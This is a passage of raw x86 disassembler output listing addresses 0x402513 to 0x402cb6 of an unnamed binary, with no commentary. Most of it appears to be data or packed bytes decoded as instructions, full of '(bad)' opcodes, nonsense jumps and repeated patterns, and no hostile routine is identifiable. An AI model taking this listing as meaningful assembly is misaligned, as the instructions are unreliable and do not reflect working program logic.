  402513:	or     DWORD PTR [eax],eax
  402515:	add    BYTE PTR [esi+0x6c],dh
  402518:	je     0x402567
  40251a:	inc    esi
  40251b:	ins    DWORD PTR es:[edi],dx
  40251c:	jne    0x40258a
  40251e:	push   esp
  40251f:	inc    ecx
  402520:	popa   
  402521:	outs   dx,BYTE PTR ds:[esi]
  402522:	dec    ebp
  402523:	gs gs push edi
  402526:	xor    DWORD PTR [ecx],ecx
  402528:	add    BYTE PTR [eax],al
  40252a:	sub    eax,0x4500400b
  40252f:	or     eax,DWORD PTR [eax+0x0]
  402532:	dec    ebp
  402533:	or     eax,DWORD PTR [eax+0x0]
  402536:	or     eax,DWORD PTR gs:[eax+0x0]
  40253a:	jmp    0xe5406549
  40253f:	or     al,BYTE PTR [eax+0x0]
  402542:	adc    DWORD PTR [ebx],ecx
  402544:	inc    eax
  402545:	add    cl,bh
  402547:	or     al,BYTE PTR [eax+0x0]
  40254a:	out    dx,al
  40254b:	imul   esi,DWORD PTR [eax+edx*2-0x1d],0x65
  402550:	arpl   WORD PTR [ecx-0x33],ax
  402553:	ins    BYTE PTR es:[edi],dx
  402554:	jb     0x4025bb
  402556:	loop   0x4025d1
  402558:	add    BYTE PTR [eax],al
  40255a:	in     eax,0x65
  40255c:	popa   
  40255d:	fs std 
  40255f:	pop    edi
  402560:	bound  esi,QWORD PTR [edx-0x30]
  402563:	jp     0x4025de
  402565:	inc    ebp
  402566:	add    BYTE PTR [ecx-0x35ffffb9],bh
  40256c:	imul   esi,DWORD PTR [edx+0x6e],0xffffff94
  402570:	xor    esi,DWORD PTR gs:[edx]
  402573:	push   edi
  402574:	ins    DWORD PTR es:[edi],dx
  402575:	ins    BYTE PTR es:[edi],dx
  402576:	ins    BYTE PTR es:[edi],dx
  402577:	xor    DWORD PTR [ecx],ecx
  402579:	add    BYTE PTR [eax],al
  40257b:	test   BYTE PTR [eax+0x76],bh
  40257e:	arpl   WORD PTR [ebx-0x6a9bd183],ax
  402584:	add    BYTE PTR gs:[eax],al
  402587:	mov    WORD PTR [esi+0x6d],gs
  40258a:	jae    0x402518
  40258c:	jge    0x40258e
  40258e:	add    BYTE PTR [eax+edi*2+0x76],bl
  402592:	arpl   WORD PTR [ebx+0x7d],sp
  402595:	cs fs dec ebp
  402598:	add    BYTE PTR gs:[eax],al
  40259b:	inc    esp
  40259c:	outs   dx,BYTE PTR ds:[esi]
  40259d:	ins    DWORD PTR es:[edi],dx
  40259e:	arpl   WORD PTR [ecx+0x72],ax
  4025a1:	add    BYTE PTR [eax],al
  4025a3:	pop    edi
  4025a4:	bound  esi,QWORD PTR [edx+0x74]
  4025a7:	inc    esp
  4025a8:	push   0x6c
  4025aa:	inc    ecx
  4025ab:	inc    ebp
  4025ac:	outs   dx,DWORD PTR gs:[esi]
  4025ae:	arpl   WORD PTR [ecx],si
  4025b0:	or     DWORD PTR [eax],eax
  4025b2:	add    bh,bh
  4025b4:	popa   
  4025b5:	jb     0x40262b
  4025b7:	and    al,0x6a
  4025b9:	ins    BYTE PTR es:[edi],dx
  4025ba:	inc    ecx
  4025bb:	add    eax,0x31636f65
  4025c0:	or     DWORD PTR [eax],eax
  4025c2:	add    ah,bl
  4025c4:	bound  ebp,QWORD PTR [ebp+0x61]
  4025c7:	add    DWORD PTR [ebx+0x69],ebx
  4025ca:	gs add dh,bh
  4025cd:	inc    ebx
  4025ce:	inc    si
  4025d0:	fsub   DWORD PTR [ebp+eiz*2+0x0]
  4025d4:	jmp    DWORD PTR [ecx+0x72]
  4025d7:	je     0x4025bd
  4025d9:	imul   ebp,DWORD PTR [eax+edx*2-0x1d],0xd2657463
  4025e1:	jl     0x4025e3
  4025e3:	add    cl,bh
  4025e5:	ins    DWORD PTR es:[edi],dx
  4025e6:	popa   
  4025e7:	jo     0x4025d9
  4025e9:	fs ins BYTE PTR es:[edi],dx
  4025eb:	outs   dx,DWORD PTR ds:[esi]
  4025ec:	ror    BYTE PTR [eax],cl
  4025ee:	add    BYTE PTR [eax],al
  4025f0:	call   0x3365:0x8c6e726e
  4025f7:	xor    cl,BYTE PTR [edi+0x6d]
  4025fa:	ins    BYTE PTR es:[edi],dx
  4025fb:	ins    BYTE PTR es:[edi],dx
  4025fc:	xor    DWORD PTR [ecx],ecx
  4025fe:	add    BYTE PTR [eax],al
  402600:	jbe    0x402670
  402602:	je     0x402654
  402604:	and    DWORD PTR [ebx+eiz*2+0x65],0xffffff82
  402609:	js     0x402653
  40260b:	gs nop
  40260d:	jns    0x40260f
  40260f:	add    BYTE PTR [ecx],dh
  402611:	or     DWORD PTR [esi+0x1],esp
  402614:	xor    DWORD PTR [ebp-0x20ce6fa7],ebp
  40261a:	add    eax,DWORD PTR [eax]
  40261c:	xor    esi,esp
  40261e:	add    eax,DWORD PTR [eax]
  402620:	xor    ebx,esi
  402622:	sti    
  402623:	add    BYTE PTR [ecx],dh
  402625:	cmp    al,BYTE PTR [ebx]
  402627:	add    BYTE PTR [ecx],dh
  402629:	loop   0x40262e
  40262b:	add    BYTE PTR [ecx],dh
  40262d:	and    al,BYTE PTR [eax+eax*1]
  402630:	add    BYTE PTR [ecx],dh
  402632:	loop   0x402637
  402634:	add    BYTE PTR [ecx],dh
  402636:	loop   0x40263b
  402638:	add    BYTE PTR [ecx],dh
  40263a:	loop   0x40263f
  40263c:	add    BYTE PTR [ecx],dh
  40263e:	loop   0x402643
  402640:	add    BYTE PTR [ecx],dh
  402642:	loop   0x402647
  402644:	add    BYTE PTR [ecx],dh
  402646:	loop   0x40264b
  402648:	add    BYTE PTR [ecx],dh
  40264a:	loop   0x40264f
  40264c:	add    BYTE PTR [ecx],dh
  40264e:	loop   0x402653
  402650:	add    BYTE PTR [ecx],dh
  402652:	bound  eax,QWORD PTR [eax+eax*1]
  402655:	xor    esp,ebp
  402657:	sbb    bh,BYTE PTR [edx+0x9afe22f]
  40265d:	sar    BYTE PTR fs:[ebx+0x25a4fd01],0x54
  402665:	(bad)  [eax]
  402667:	ja     0x402689
  402669:	shr    edi,0x6a
  40266c:	addr16 ret 
  40266e:	shr    BYTE PTR [eax+0x20],0x92
  402672:	shr    DWORD PTR [ecx+0x6e],0x96
  402676:	aam    0x23
  402678:	bound  edx,QWORD PTR [eax+eax*1+0x877576]
  40267f:	ins    DWORD PTR es:[edi],dx
  402680:	outs   dx,BYTE PTR ds:[esi]
  402681:	push   ecx
  402682:	lods   al,BYTE PTR ds:[esi]
  402683:	dec    edx
  402684:	push   ebx
  402685:	push   ecx
  402686:	int    0x6a
  402688:	fs xchg esp,eax
  40268a:	repnz or BYTE PTR ds:0x3cd092b,cl
  402691:	xor    DWORD PTR [ecx],ecx
  402693:	jmp    0x971269b
  402698:	mov    ecx,0x9d093140
  40269d:	add    al,0x32
  40269f:	or     DWORD PTR [ebp+0x47],ebx
  4026a2:	cmp    BYTE PTR [ecx-0x17],bl
  4026a5:	add    esi,DWORD PTR [ecx]
  4026a7:	or     ecx,ebp
  4026a9:	add    esi,DWORD PTR [ecx]
  4026ab:	or     DWORD PTR [ecx],ecx
  4026ad:	add    al,0x26
  4026af:	or     dl,dh
  4026b1:	add    al,0x33
  4026b3:	aaa    
  4026b4:	jmp    0xe94956d4
  4026b9:	push   ebp
  4026ba:	xor    DWORD PTR [ecx],ecx
  4026bc:	jmp    0x104957c4
  4026c1:	pop    es
  4026c2:	xor    BYTE PTR [ecx],cl
  4026c4:	jmp    0xe94957dc
  4026c9:	xor    esi,DWORD PTR [eax]
  4026cb:	or     ecx,ebp
  4026cd:	add    esi,ecx
  4026cf:	or     cl,ch
  4026d1:	adc    esi,DWORD PTR [ecx]
  4026d3:	or     ecx,ebp
  4026d5:	add    eax,0x3ed0931
  4026da:	xor    DWORD PTR [ecx],ecx
  4026dc:	jmp    0xed4957e4
  4026e1:	add    esi,DWORD PTR [ecx]
  4026e3:	or     ecx,ebp
  4026e5:	add    esi,DWORD PTR [ecx]
  4026e7:	or     ecx,ebp
  4026e9:	xchg   ebx,eax
  4026ea:	xor    BYTE PTR [ecx],cl
  4026ec:	jmp    0xf14957f6
  4026f1:	aas    
  4026f2:	xor    ecx,DWORD PTR [ecx]
  4026f4:	jmp    0x4026f9
  4026f6:	xor    DWORD PTR [ecx],ecx
  4026f8:	jmp    0x9812700
  4026fd:	jmp    0xe9495815
  402702:	add    esp,DWORD PTR [ecx]
  402704:	or     ecx,ebp
  402706:	adc    esi,DWORD PTR [ecx]
  402708:	or     DWORD PTR [eax],eax
  40270a:	jmp    0xd9403041
  40270f:	xor    cl,BYTE PTR [ecx]
  402711:	add    cl,ch
  402713:	xor    cl,BYTE PTR [ecx]
  402715:	add    cl,ch
  402717:	xor    cl,BYTE PTR [ecx]
  402719:	add    BYTE PTR ds:0x21000858,bl
  40271f:	xor    cl,BYTE PTR [ecx]
  402721:	add    cl,ch
  402723:	xor    cl,BYTE PTR [ecx]
  402725:	add    cl,ch
  402727:	xor    cl,BYTE PTR [ecx]
  402729:	add    cl,ch
  40272b:	xor    cl,BYTE PTR [ecx]
  40272d:	add    cl,ch
  40272f:	xor    cl,BYTE PTR [ecx]
  402731:	add    cl,ch
  402733:	xor    cl,BYTE PTR [ecx]
  402735:	add    cl,ch
  402737:	xor    cl,BYTE PTR [ecx]
  402739:	add    cl,ch
  40273b:	xor    cl,BYTE PTR [ecx]
  40273d:	add    cl,ch
  40273f:	xor    cl,BYTE PTR [ecx]
  402741:	add    cl,ch
  402743:	xor    cl,BYTE PTR [ecx]
  402745:	add    cl,ch
  402747:	xor    cl,BYTE PTR [ecx]
  402749:	add    cl,ch
  40274b:	xor    cl,BYTE PTR [ecx]
  40274d:	add    cl,ch
  40274f:	xor    cl,BYTE PTR [ecx]
  402751:	add    cl,ch
  402753:	xor    cl,BYTE PTR [ecx]
  402755:	add    cl,ch
  402757:	xor    cl,BYTE PTR [ecx]
  402759:	add    cl,ch
  40275b:	xor    cl,BYTE PTR [ecx]
  40275d:	add    cl,ch
  40275f:	add    BYTE PTR [edx],dh
  402761:	or     DWORD PTR [eax],eax
  402763:	jmp    0xe940309a
  402768:	xor    cl,BYTE PTR [ecx]
  40276a:	add    cl,ch
  40276c:	xor    cl,BYTE PTR [ecx]
  40276e:	add    cl,ch
  402770:	xor    cl,BYTE PTR [ecx]
  402772:	add    BYTE PTR [ebp+0x79000ab3],dh
  402778:	xor    cl,BYTE PTR [ecx]
  40277a:	add    cl,ch
  40277c:	xor    cl,BYTE PTR [ecx]
  40277e:	add    cl,ch
  402780:	xor    cl,BYTE PTR [ecx]
  402782:	add    BYTE PTR [eax],al
  402784:	sbb    BYTE PTR ds:0xd180000,cl
  40278a:	add    BYTE PTR [eax],al
  40278c:	or     BYTE PTR ds:0xd080000,cl
  402792:	add    BYTE PTR [eax],al
  402794:	push   es
  402795:	popa   
  402796:	gs js  0x402755
  402799:	or     al,0x0
  40279b:	add    BYTE PTR [ebx-0x37fffee7],dl
  4027a1:	sbb    al,0x0
  4027a3:	add    al,bl
  4027a5:	adc    al,0x1
  4027a7:	add    al,bl
  4027a9:	push   es
  4027aa:	add    BYTE PTR [eax],al
  4027ac:	enter  0xc,0x0
  4027b0:	enter  0xc,0x0
  4027b4:	cwde   
  4027b5:	or     al,0x0
  4027b7:	add    BYTE PTR [eax],bh
  4027b9:	add    eax,0x77366000
  4027be:	fs popa 
  4027c0:	cld    
  4027c1:	imul   eax,DWORD PTR [eax],0x0
  4027c4:	add    BYTE PTR [eax-0x67fffff5],bl
  4027ca:	cmp    al,0x1
  4027cc:	add    BYTE PTR [eax-0x77fffffa],cl
  4027d2:	push   cs
  4027d3:	add    DWORD PTR [eax],eax
  4027d5:	pop    eax
  4027d6:	or     al,0x0
  4027d8:	add    BYTE PTR [eax+0xc],bl
  4027db:	add    BYTE PTR [eax],al
  4027dd:	dec    eax
  4027de:	or     al,0x0
  4027e0:	add    BYTE PTR [eax],cl
  4027e2:	add    eax,0x50664000
  4027e7:	popa   
  4027e8:	je     0x402823
  4027ea:	add    eax,0x41f00000
  4027ef:	add    BYTE PTR [eax],al
  4027f1:	dec    eax
  4027f2:	dec    esp
  4027f3:	add    DWORD PTR [eax],eax
  4027f5:	sbb    BYTE PTR [esi],bh
  4027f7:	add    BYTE PTR [eax],al
  4027f9:	sbb    BYTE PTR [eax],bl
  4027fb:	add    DWORD PTR [eax],eax
  4027fd:	xor    edx,esp
  4027ff:	add    eax,DWORD PTR [eax]
  402801:	xor    edx,esp
  402803:	add    eax,DWORD PTR [eax]
  402805:	xor    edx,esp
  402807:	add    eax,DWORD PTR [eax]
  402809:	xor    DWORD PTR [edx-0x1e0efffd],esp
  40280f:	add    eax,DWORD PTR [eax]
  402811:	xor    edx,esp
  402813:	add    eax,DWORD PTR [eax]
  402815:	xor    edx,esp
  402817:	add    eax,DWORD PTR [eax]
  402819:	xor    edx,esp
  40281b:	add    eax,DWORD PTR [eax]
  40281d:	xor    DWORD PTR [ebp-0x457e1374],ebp
  402823:	imul   ecx,DWORD PTR [edi],0x21
  402826:	mov    ds:0x4300f803,al
  40282b:	loope  0x4027f1
  40282d:	(bad)  
  40282e:	mov    esi,0x306a0b6c
  402833:	mov    WORD PTR [ebx],es
  402835:	call   0x44f664
  40283a:	js     0x4027df
  40283c:	add    BYTE PTR [eax],al
  40283e:	add    al,0x6b
  402840:	call   0x268a2195
  402845:	adc    cl,dh
  402847:	loope  0x402844
  402849:	jb     0x40287b
  40284b:	mov    ds:0xe9fc83f7,eax
  402850:	add    esi,DWORD PTR [edx+ebp*1+0x6b]
  402854:	push   ecx
  402855:	or     BYTE PTR [edx+0x3975f6f3],bh
  40285b:	(bad)  
  40285c:	push   edx
  40285d:	or     BYTE PTR [eax-0x5d],ch
  402860:	add    BYTE PTR [eax],al
  402862:	cld    
  402863:	push   0xffffffe8
  402865:	xor    DWORD PTR [ebp-0x77],0x54
  402869:	pop    eax
  40286a:	fst    DWORD PTR [esp+edx*1]
  40286d:	inc    eax
  40286e:	xor    DWORD PTR [edx+0x72],edi
  402871:	add    DWORD PTR [edx+0x5e],esi
  402874:	div    DWORD PTR [ebp+0x3d]
  402877:	or     DWORD PTR [esi+0x41],esi
  40287a:	sub    edi,eax
  40287c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40287d:	div    DWORD PTR [ecx]
  40287f:	or     ecx,ebp
  402881:	add    ebp,DWORD PTR [edx+0x238ae154]
  402887:	arpl   cx,bp
  402889:	idiv   BYTE PTR [ecx+ebx*1+0x3e]
  40288d:	jno    0x40288f
  40288f:	std    
  402890:	out    dx,al
  402891:	mov    esp,0xe174f6fb
  402896:	test   BYTE PTR [ebx+0x35c23015],0x9
  40289d:	mov    ah,0x8a
  40289f:	int    0x8a
  4028a1:	sub    eax,0x815181fc
  4028a6:	test   DWORD PTR [ecx],esp
  4028a8:	dec    ecx
  4028a9:	jmp    0x2a486ca9
  4028ae:	div    esi
  4028b0:	inc    esp
  4028b1:	icebp  
  4028b2:	add    esi,DWORD PTR [ecx]
  4028b4:	or     ecx,ebp
  4028b6:	mov    esi,0x3e9ecf4
  4028bb:	xor    DWORD PTR [ecx],ecx
  4028bd:	jb     0x40290f
  4028bf:	sub    DWORD PTR [edx-0xf137705],eax
  4028c5:	cmp    DWORD PTR [edx+0x33],ebp
  4028c8:	out    dx,al
  4028c9:	cmp    al,0xf8
  4028cb:	xchg   BYTE PTR [ecx+eax*8-0xa],dh
  4028cf:	add    al,0x1
  4028d1:	mov    dh,0x51
  4028d3:	sbb    eax,0x78fc2482
  4028d8:	retf   
  4028d9:	in     eax,dx
  4028da:	add    edi,esp
  4028dc:	or     DWORD PTR [ebp+0x39f17582],0xf9bcc95c
  4028e6:	inc    ebx
  4028e7:	xor    ecx,esi
  4028e9:	sti    
  4028ea:	add    al,0x72
  4028ec:	out    dx,al
  4028ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ee:	inc    eax
  4028ef:	cmp    DWORD PTR [ecx],ecx
  4028f1:	add    cl,ch
  4028f3:	add    BYTE PTR [edx],dh
  4028f5:	or     edi,eax
  4028f7:	and    al,0x29
  4028f9:	or     DWORD PTR [eax],eax
  4028fb:	jmp    0xf195ab32
  402900:	stos   DWORD PTR es:[edi],eax
  402901:	sbb    cl,BYTE PTR [ebp+0x6a591aac]
  402907:	call   0x473c9d13
  40290c:	xor    ecx,0xee2ab4ff
  402912:	push   edx
  402913:	(bad)  
  402915:	jae    0x40291f
  402917:	inc    ecx
  402918:	mov    bl,0xed
  40291a:	jmp    DWORD PTR [esi]
  40291c:	add    BYTE PTR [edx+0x1aabf155],0x6a
  402923:	jmp    0x953f3270
  402928:	(bad)  
  402929:	in     eax,dx
  40292a:	jne    0x40292d
  40292c:	mov    edi,0x61fe0873
  402931:	adc    eax,0xf1616258
  402936:	add    edx,DWORD PTR [esi+esi*1-0x58a02fce]
  40293d:	and    al,al
  40293f:	mov    al,0x73
  402941:	add    BYTE PTR [eax],al
  402943:	xchg   ecx,eax
  402944:	xor    cl,BYTE PTR [ecx]
  402946:	add    cl,ch
  402948:	jnp    0x402914
  40294a:	or     cl,ch
  40294c:	test   DWORD PTR [ecx-0x138e9514],0x32051150
  402956:	adc    DWORD PTR [ecx],ebp
  402958:	add    BYTE PTR ds:0x71e872f1,dh
  40295e:	in     eax,dx
  40295f:	call   DWORD PTR [eax*2+0x4ae175ee]
  402966:	je     0x402967
  402968:	mov    es,WORD PTR [ecx+eax*1-0x40]
  40296c:	add    BYTE PTR [ebp-0x13],al
  40296f:	enter  0x4cc2,0x9
  402973:	mov    edx,DWORD PTR [ebp+0x50]
  402976:	adc    BYTE PTR [edx],0x8d
  402979:	push   ebp
  40297a:	icebp  
  40297b:	push   eax
  40297c:	inc    DWORD PTR ds:0xc75ff19
  402982:	div    BYTE PTR [ebp+0x8]
  402985:	jg     0x4029de
  402987:	or     al,0x85
  402989:	pop    eax
  40298a:	ins    DWORD PTR es:[edi],dx
  40298b:	adc    ecx,DWORD PTR [ebx+0x453bf4d5]
  402991:	fcomp  DWORD PTR [ebx+0x7]
  402994:	mov    eax,0x909
  402999:	jae    0x402986
  40299b:	sub    al,al
  40299d:	inc    ebx
  40299e:	pop    es
  40299f:	sub    eax,eax
  4029a1:	and    edi,eax
  4029a3:	or     al,0x0
  4029a5:	xchg   ebp,eax
  4029a6:	sub    esp,0x56f11483
  4029ac:	push   eax
  4029ad:	nop
  4029ae:	pusha  
  4029af:	xchg   ebx,eax
  4029b0:	adc    DWORD PTR [eax-0x368d07f8],ecx
  4029b6:	leave  
  4029b7:	inc    DWORD PTR [ebx+0x7400041d]
  4029bd:	add    BYTE PTR [esi-0x77f78277],dl
  4029c3:	pop    ebx
  4029c4:	pop    es
  4029c5:	sub    ecx,eax
  4029c7:	push   esi
  4029c8:	leave  
  4029c9:	ret    0x86c
  4029cc:	cmp    DWORD PTR [ebp+0x68],0x8
  4029d0:	jne    0x4029dc
  4029d2:	mov    al,0x7
  4029d4:	add    BYTE PTR [eax],al
  4029d6:	mov    BYTE PTR [esi-0x37],dl
  4029d9:	ret    0x88c
  4029dc:	mov    esi,DWORD PTR [ebp+0x5c]
  4029df:	lods   eax,DWORD PTR ds:[esi]
  4029e0:	inc    ebp
  4029e1:	cld    
  4029e2:	dec    eax
  4029e3:	or     BYTE PTR [eax],al
  4029e5:	add    BYTE PTR [ecx],dh
  4029e7:	addr16 dec esi
  4029e9:	or     BYTE PTR [edx+0x454586f0],bh
  4029ef:	adc    dh,ch
  4029f1:	jne    0x402a14
  4029f3:	adc    al,0xf5
  4029f5:	jne    0x402a20
  4029f7:	jae    0x402a4a
  4029f9:	adc    BYTE PTR [ecx+eiz*4+0x225a077a],dh
  402a00:	push   ebp
  402a01:	leave  
  402a02:	repz fld QWORD PTR [ebx]
  402a05:	adc    DWORD PTR [esi+edx*2+0x7367503],0xffffffc4
  402a0d:	pop    esi
  402a0e:	clc    
  402a0f:	pop    ds
  402a10:	pop    es
  402a11:	add    BYTE PTR [edx+0x103f7a4],ch
  402a17:	or     DWORD PTR [edi],edi
  402a19:	adc    BYTE PTR [esi+eiz*1-0x45],ah
  402a1d:	add    DWORD PTR [ecx],esi
  402a1f:	loop   0x402a24
  402a21:	pop    esi
  402a22:	add    al,ch
  402a24:	pop    ds
  402a25:	pop    es
  402a26:	add    BYTE PTR [edi+eiz*2-0x19],bh
  402a2a:	xor    ebp,0xc6ffe419
  402a30:	xchg   ecx,eax
  402a31:	pop    ebx
  402a32:	push   0x43d025
  402a37:	mov    ecx,0xaec3026f
  402a3c:	xchg   DWORD PTR [ebx],eax
  402a3e:	push   0x31
  402a40:	pop    eax
  402a41:	pop    es
  402a42:	push   0x31
  402a44:	pop    eax
  402a45:	pop    es
  402a46:	push   0x8003e231
  402a4b:	mov    ss,WORD PTR [esp+edi*8-0x19]
  402a4f:	inc    edx
  402a50:	mov    cl,0x4
  402a52:	add    BYTE PTR [eax-0x3bf0fdc],ch
  402a58:	fnstsw WORD PTR [edx+eax*8+0x5de239]
  402a5f:	mov    ah,0x8
  402a61:	sub    al,0xec
  402a63:	add    DWORD PTR [ecx-0x17],esp
  402a66:	adc    esi,DWORD PTR [ecx]
  402a68:	or     DWORD PTR [ecx+ecx*4+0x49],esp
  402a6c:	fisttp DWORD PTR [esi-0x3141e0d]
  402a72:	out    dx,eax
  402a73:	dec    ecx
  402a74:	adc    eax,0x310478
  402a79:	test   eax,0xf4ea3f79
  402a7e:	out    dx,eax
  402a7f:	sbb    ebx,edi
  402a81:	push   edi
  402a82:	add    al,0x31
  402a84:	push   ds
  402a85:	sub    DWORD PTR [ebp-0x16fe0d00],edi
  402a8b:	repnz test cl,dh
  402a8e:	pop    esp
  402a8f:	mov    DWORD PTR [ecx],ecx
  402a91:	fild   DWORD PTR [esi-0xd]
  402a94:	popa   
  402a95:	jmp    0xf335:0xfd0effb4
  402a9c:	out    dx,al
  402a9d:	xchg   BYTE PTR [ebx+ebp*8-0xc9a8bcf],ch
  402aa4:	fs in  eax,dx
  402aa6:	adc    ebp,ebx
  402aa8:	loope  0x402ab3
  402aaa:	jmp    0xe9495b5a
  402aaf:	add    edi,eax
  402ab1:	(bad)  
  402ab2:	icebp  
  402ab3:	add    esp,DWORD PTR [esi+edi*2+0xd]
  402ab7:	push   esp
  402ab8:	pop    ecx
  402ab9:	popa   
  402aba:	push   eax
  402abb:	push   ss
  402abc:	icebp  
  402abd:	or     cl,dh
  402abf:	jne    0x402af1
  402ac1:	(bad)  
  402ac2:	out    0x5d,al
  402ac4:	xor    ebx,DWORD PTR [edi-0x17]
  402ac7:	repnz sbb al,0x1
  402aca:	rcl    DWORD PTR [ecx-0x43311574],0x73
  402ad1:	add    eax,0xddaa58e9
  402ad6:	sbb    DWORD PTR [ecx+ecx*1-0x4f],ecx
  402ada:	add    bl,bl
  402adc:	repnz or al,bh
  402adf:	cmp    ebp,DWORD PTR [esi+eax*8]
  402ae2:	call   DWORD PTR [ebx]
  402ae4:	xor    eax,0xd99e005f
  402ae9:	add    al,ch
  402aeb:	push   ss
  402aec:	add    BYTE PTR [eax-0x16],al
  402aef:	jmp    DWORD PTR [eax+0x1c00056c]
  402af5:	mov    esi,0x4aa583dc
  402afa:	pop    ecx
  402afb:	pop    eax
  402afc:	add    edi,edi
  402afe:	push   ss
  402aff:	inc    eax
  402b00:	jmp    0x2a41a21f
  402b05:	and    ebp,edx
  402b07:	jne    0x402af6
  402b09:	mov    bl,0x43
  402b0b:	clc    
  402b0c:	cs jns 0x402afc
  402b0f:	add    cl,ch
  402b11:	xor    cl,BYTE PTR [ecx]
  402b13:	push   0xffffffe9
  402b15:	add    esi,DWORD PTR [esp+ecx*1+0x3e]
  402b19:	jns    0x402b1c
  402b1b:	call   0x2a0cc6
  402b20:	bound  ecx,QWORD PTR [ecx-0x1c0474ff]
  402b26:	jae    0x402b24
  402b28:	push   ds
  402b29:	pop    ecx
  402b2a:	icebp  
  402b2b:	call   FWORD PTR [edx+ecx*8-0x7a0ead16]
  402b32:	(bad)  
  402b33:	or     cl,ch
  402b35:	pop    ecx
  402b36:	jle    0x402b24
  402b38:	cdq    
  402b39:	push   0x61
  402b3b:	sbb    dl,bl
  402b3d:	repnz or al,bh
  402b40:	jnp    0x402b6f
  402b42:	(bad)  
  402b43:	call   DWORD PTR [ebx+0x35]
  402b46:	jmp    0xd6ff:0xa27af175
  402b4d:	cmp    BYTE PTR [edi+0x3200e5c2],0x54
  402b54:	mov    eax,DWORD PTR [eax]
  402b56:	imul   edx,DWORD PTR fs:[ebp+0x14],0xb
  402b5b:	sbb    eax,DWORD PTR [eax]
  402b5d:	jne    0x402bbb
  402b5f:	scas   al,BYTE PTR es:[edi]
  402b60:	ret    0x5810
  402b63:	clc    
  402b64:	jne    0x402b76
  402b66:	xchg   edi,eax
  402b67:	jno    0x402b75
  402b69:	(bad)  
  402b6a:	cmp    eax,0xa5e6e7ed
  402b6f:	idiv   edi
  402b71:	mov    edi,ebp
  402b73:	adc    BYTE PTR [ecx],ah
  402b75:	add    al,BYTE PTR [ecx+0x1d0010c2]
  402b7b:	ins    BYTE PTR es:[edi],dx
  402b7c:	in     al,dx
  402b7d:	sbb    esp,0xffffffd9
  402b80:	push   DWORD PTR [ebp+0x4]
  402b83:	inc    edi
  402b84:	add    al,0x8d
  402b86:	int    0xf8
  402b88:	push   eax
  402b89:	(bad)  
  402b8a:	std    
  402b8b:	in     al,0xe7
  402b8d:	ret    
  402b8e:	addr16 (bad) 
  402b91:	mov    ecx,ebp
  402b93:	call   0x6148641a
  402b98:	pop    es
  402b99:	mov    ecx,ebp
  402b9b:	clc    
  402b9c:	bswap  eax
  402b9e:	jae    0x402baf
  402ba0:	sub    eax,eax
  402ba2:	adc    edi,ecx
  402ba4:	or     BYTE PTR [eax],al
  402ba6:	popf   
  402ba7:	gs in  al,dx
  402ba9:	or     DWORD PTR [ecx+ebx*8],0xffffffff
  402bad:	jne    0x402b83
  402baf:	inc    esi
  402bb0:	add    cl,BYTE PTR [ebp-0xaf2573]
  402bb6:	add    BYTE PTR ds:0xb797e7e4,bh
  402bbc:	fcos   
  402bbe:	mov    ebx,ebp
  402bc0:	call   0x60d86447
  402bc5:	or     BYTE PTR [edi],cl
  402bc7:	mov    edi,0xcc86fe4f
  402bcc:	lds    eax,FWORD PTR [edx]
  402bce:	sub    esi,DWORD PTR [ecx]
  402bd0:	mov    dl,0xba
  402bd2:	ret    0xf239
  402bd5:	push   esi
  402bd6:	mov    ecx,DWORD PTR [ebp+0x76fcc773]
  402bdc:	sbb    eax,0x6d306a00
  402be1:	inc    esi
  402be2:	inc    DWORD PTR [ecx]
  402be4:	mov    bh,0x76
  402be6:	or     BYTE PTR [ecx-0x4],cl
  402be9:	lock call DWORD PTR [esi+0x5b]
  402bed:	inc    esi
  402bee:	or     al,0xb2
  402bf0:	mov    edx,0xc72f7403
  402bf5:	mov    ecx,0x57b3e45
  402bfa:	sub    esi,DWORD PTR [ecx-0x67]
  402bfd:	lds    ecx,FWORD PTR [eax]
  402bff:	xor    DWORD PTR ds:0xfcbaec7d,eax
  402c05:	adc    eax,DWORD PTR [ebx+0x476f25b]
  402c0b:	call   0x10402b43
  402c10:	(bad)  
  402c13:	jl     0x402bff
  402c15:	fcmovnbe st,st(0)
  402c17:	std    
  402c18:	dec    esi
  402c19:	lock or eax,DWORD PTR [eax]
  402c1c:	icebp  
  402c1d:	pushf  
  402c1e:	cld    
  402c1f:	mov    al,BYTE PTR [edx+eax*8-0xdcefd38]
  402c26:	add    eax,DWORD PTR [eax]
  402c28:	retf   0x5ddc
  402c2b:	add    esi,edx
  402c2d:	jl     0x402c2e
  402c2f:	inc    BYTE PTR [edx+ebp*8-0x25]
  402c33:	cmp    eax,0xc9f016c5
  402c38:	repz fld QWORD PTR [ebx]
  402c3b:	push   ebp
  402c3c:	stos   BYTE PTR es:[edi],al
  402c3d:	adc    eax,0x87adc484
  402c42:	jl     0x402cb9
  402c44:	xor    eax,0xf48d038c
  402c49:	or     ch,ah
  402c4b:	push   esp
  402c4c:	xchg   esi,eax
  402c4d:	pop    ebp
  402c4e:	stc    
  402c4f:	push   ebp
  402c50:	mov    ds,WORD PTR [ebp-0x1f]
  402c53:	(bad)  
  402c55:	imul   ecx
  402c57:	add    ebp,DWORD PTR [edx]
  402c59:	leave  
  402c5a:	cmp    eax,0xbd65b206
  402c5f:	add    al,0xe4
  402c61:	lar    eax,sp
  402c64:	pop    es
  402c65:	shr    BYTE PTR [ebx+0x2c943100],cl
  402c6b:	lock xor bl,cl
  402c6e:	ror    BYTE PTR [eax+0x21],1
  402c71:	pop    esi
  402c72:	mov    edx,0xe90930ac
  402c77:	add    ebx,edi
  402c79:	shr    DWORD PTR [ebx+0x723e3100],1
  402c7f:	loopne 0x402c81
  402c81:	mov    al,0xcd
  402c83:	icebp  
  402c84:	out    dx,al
  402c85:	es out 0x1a,eax
  402c88:	sbb    edi,edx
  402c8a:	jae    0x402c75
  402c8c:	pop    ecx
  402c8d:	xor    DWORD PTR [ebx-0x15],esi
  402c90:	pop    ecx
  402c91:	xor    DWORD PTR [ebx-0x16],esi
  402c94:	pop    ebx
  402c95:	xor    DWORD PTR [ecx],ecx
  402c97:	jmp    0xf59d2b5f
  402c9c:	fild   DWORD PTR [ecx]
  402c9e:	clc    
  402c9f:	jmp    0x358ce4a7
  402ca4:	inc    esp
  402ca5:	pop    ebp
  402ca6:	cmp    ch,BYTE PTR [esi]
  402ca8:	jns    0x402cd3
  402caa:	icebp  
  402cab:	aam    0xed
  402cad:	(bad)  
  402cae:	out    0x26,al
  402cb0:	dec    ecx
  402cb1:	leave  
  402cb2:	or     ecx,ebp
  402cb4:	add    esi,DWORD PTR [ecx]
  402cb6:	xchg   edx,eax
